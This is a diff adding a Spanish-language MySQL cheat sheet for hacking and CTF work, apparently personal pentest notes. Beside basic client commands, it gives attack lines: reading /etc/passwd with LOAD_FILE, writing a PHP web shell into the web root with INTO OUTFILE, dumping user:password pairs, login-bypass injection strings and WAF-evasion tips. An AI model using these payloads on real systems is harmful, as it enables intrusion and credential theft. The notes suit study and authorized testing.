@@ -1,0 +1,72 @@
+# MySQL
+
+---
+
+Cheatsheet de MySQL
+
+MySQL es una de las bases de datos más usadas en entornos web (LAMP, WAMP, etc.). En hacking se explota mediante inyección SQL o acceso directo.
+Comandos básicos (cliente mysql)
+Comando	Descripción
+SHOW DATABASES;	Lista todas las bases de datos
+USE nombre_db;	Selecciona base de datos
+SHOW TABLES;	Lista tablas de la DB actual
+DESCRIBE nombre_tabla;	Muestra estructura de la tabla
+SELECT VERSION();	Versión del servidor MySQL
+SELECT USER();	Usuario actual
+SELECT DATABASE();	Base actual
+SELECT @@version_comment;	Información del sistema (ej. Debian, Homebrew)
+Funciones útiles para enumeración y explotación
+
+Información del sistema:
+sql
+
+SELECT @@hostname, @@datadir, @@tmpdir, @@basedir;
+
+Leer archivos (si se tiene FILE privilege):
+sql
+
+SELECT LOAD_FILE('/etc/passwd');
+
+Escribir archivos (web shell):
+sql
+
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+Enumerar columnas con information_schema:
+sql
+
+-- Tablas
+SELECT table_name FROM information_schema.tables WHERE table_schema=database();
+-- Columnas de una tabla
+SELECT column_name FROM information_schema.columns WHERE table_name='users';
+
+Comentarios (importante en inyección):
+sql
+
+-- Comentario estándar (requiere espacio después de --)
+# Comentario estilo MySQL (hasta nueva línea)
+/* Comentario bloque */
+
+Concatenación:
+sql
+
+SELECT CONCAT(user, ':' , password) FROM users;
+SELECT GROUP_CONCAT(column) FROM table;  -- para unir filas
+
+Subversión de autenticación (inyección clásica):
+sql
+
+' OR '1'='1' --
+admin' -- -
+' UNION SELECT 1,2,3 -- -
+
+¿Por qué es útil en hacking?
+
+    Dominio en CTFs/web: MySQL es el motor más común. Saber su dialecto y funciones (LOAD_FILE, INTO OUTFILE, UNION) es esencial para extraer datos o lograr RCE.
+
+    Escalada de privilegios: si te conectas como root de MySQL, puedes leer cualquier archivo del sistema o escribir una shell.
+
+    Filtros y evasión: usa comentarios (/**/, -- , #) y dobles consultas para bypassear WAFs.
+
+    Información del servidor: mediante variables como @@version_comment puedes saber si el sistema está parcheado.
+
